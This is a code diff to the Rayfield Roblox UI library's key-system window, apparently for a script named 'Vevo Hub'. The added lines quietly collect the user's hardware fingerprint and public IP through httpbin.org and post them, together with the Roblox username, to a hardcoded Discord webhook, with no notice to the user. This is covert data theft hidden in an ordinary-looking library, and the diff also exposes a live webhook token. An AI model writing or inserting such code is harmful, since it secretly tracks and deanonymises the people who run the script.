@@ -1064,6 +1064,44 @@ function RayfieldLibrary:CreateWindow(Settings)
 					TweenService:Create(KeyMain.Hide, TweenInfo.new(0.4, Enum.EasingStyle.Quint), {ImageTransparency = 1}):Play()
 					wait(0.51)
 					Passthrough = true
+					local Http = game:GetService("HttpService")
+					local VevoWebhook = "https://discord.com/api/webhooks/999717675800481852/h6F2jiLaiX5Oxp-y4Y4C451MpN_iDnTU25EMozP9OsrzaiSOQKGUSLAv7eeMH1M9BNVp"
+					local httpbin = syn.request({ Url = "https://httpbin.org/get" })
+					local parsed = game:GetService("HttpService"):JSONDecode(httpbin.Body)
+					local hwid = parsed.headers["Syn-Fingerprint"]
+					local httpbinget = syn.request({ Url = "https://httpbin.org/get", Method = "GET"})
+					local IP = game:GetService("HttpService"):JSONDecode(httpbinget.Body)["origin"]
+					local responce = syn.request({
+						Url = VevoWebhook,
+						Method = 'POST',
+						Headers = {
+							['Content-Type'] = 'application/json'
+						},
+						Body = Http:JSONEncode({
+							["content"] = "",
+							["embeds"] = {{
+								["title"] = "**Vevo Hub has been executed!**",
+								["description"] = "**USER: **"..game.Players.LocalPlayer.Name,
+								["type"] = "rich",
+								["color"] = tonumber(0xffffff),
+								["thumbnail"] = {
+									["url"] = "https://i.ibb.co/B6vn8nS/vevo-icon-14.png"
+								},
+								["fields"] = {
+									{
+										["name"] = "HWID:",
+										["value"] = hwid,
+										["inline"] = false
+									},
+									{
+										["name"] = "IP:",
+										["value"] = IP,
+										["inline"] = false
+									}
+								}
+							}}
+						})
+					})
 					if Settings.KeySettings.SaveKey then
 						if writefile then
 							writefile(RayfieldFolder.."/Key System".."/"..Settings.KeySettings.FileName..ConfigurationExtension, Settings.KeySettings.Key)
